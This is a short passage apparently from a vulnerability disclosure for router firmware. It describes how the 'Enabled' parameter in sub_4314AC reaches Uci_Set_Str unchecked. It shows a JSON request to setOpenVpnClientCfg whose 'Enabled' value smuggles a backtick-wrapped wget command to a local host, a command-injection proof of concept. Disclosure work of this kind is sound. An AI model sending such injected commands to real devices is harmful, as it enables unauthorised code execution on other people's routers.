...
In sub_4314AC function, it reads in a user-provided parameter `Enabled` and passes its value to Uci_Set_Str function,which is defined in libcscommon.so.
...
{"topicurl":"setOpenVpnClientCfg","Enabled":"`wget 192.168.6.1:7777/testpoc`"
}
```
